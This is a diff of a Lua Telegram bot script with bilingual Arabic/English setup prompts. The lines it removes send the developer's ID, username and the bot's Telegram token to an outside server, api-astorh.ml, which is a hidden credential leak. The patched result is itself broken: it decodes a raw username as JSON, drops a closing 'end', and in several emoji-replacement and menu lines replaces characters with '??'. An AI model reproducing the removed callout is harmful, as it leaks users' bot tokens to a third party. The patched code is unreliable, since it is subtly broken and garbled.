@@ -32,12 +32,7 @@ end
 if not redis:get(Server_Devid.."User_Devbots1") then
 io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف Carbon ...\n\27[0;39;49m')
 local User_Sudo = io.read():gsub('@','')
-if User_Sudo ~= '' then
-local GetInfoUser = https.request("https://api-astorh.ml/api/source/?id="..User_Sudo)
-local User_Info = JSON.decode(GetInfoUser) 
-io.write('\n\27[1;31m If ip server is blocked : سيرفرك لقد تم حظره من السورس \n\27[0;39;49m')
-os.exit()
-end
+local User_Info = JSON.decode(User_Sudo) 
 if User_Info.Info.Chek == "Not_Info" then
 io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
 os.execute('lua ALRAQE.lua')
@@ -50,10 +45,8 @@ io.write('\n\27[1;31m• The UserNamr Is Saved : تم حفظ معرف Commander 
 print(User_Info.Info.Username,User_Info.Info.Id)
 redis:set(Server_Devid.."User_Devbots1",User_Info.Info.Username)
 redis:set(Server_Devid.."Id_Devbotsid",User_Info.Info.Id)
-https.request("https://api-astorh.ml/api/insert/?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..redis:get(Server_Devid.."Token_Devbot"))
 else
 io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
-end 
 os.execute('lua ALRAQE.lua')
 end
 
@@ -117,6 +110,7 @@ Status = false
 end  
 return Status
 end
+Load_File()
 ------------------------------------------------------------------------------------------------------------
 sudos = dofile("./Info_Sudo.lua")
 token = sudos.Token_Bot
@@ -7499,14 +7493,14 @@ name = string.gsub(name,"☠","💀💀💀💀💀💀💀☠💀💀💀💀�
 name = string.gsub(name,"🐼","👻👻👻🐼👻👻👻👻??👻👻")
 name = string.gsub(name,"🐇","🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊")
 name = string.gsub(name,"🌑","🌚🌚🌚🌚🌚🌑🌚🌚🌚")
-name = string.gsub(name,"??","🌑🌑🌑🌑🌑🌚🌑🌑🌑")
+name = string.gsub(name,"🌚","🌑🌑🌑🌑🌑🌚🌑🌑🌑")
 name = string.gsub(name,"⭐️","⭐️")
 name = string.gsub(name,"✨","💫💫💫💫💫✨💫💫💫💫")
 name = string.gsub(name,"⛈","🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨")
 name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️")
 name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
 name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬")
-name = string.gsub(name,"👨‍💻","👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻")
+name = string.gsub(name,"👨‍💻","👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍??👩‍💻")
 name = string.gsub(name,"👨‍🔧","👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍??")
 name = string.gsub(name,"👩‍🍳","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳")
 name = string.gsub(name,"🧚‍♀","🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂")
@@ -8835,7 +8829,7 @@ local List = {[[
 -›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 ¦ #username .
 -›   𝙸𝙳 ¦ #msgs .
 -›   𝚂𝚃𝙰𝚂𝚃 ¦ #stast .
--›   𝙼𝚂𝙶𝚂 ¦ #id .
+-›   𝙼𝚂𝙶?? ¦ #id .
 ]],
 [[
 𝐔𝐬𝐞𝐫  : #username  .
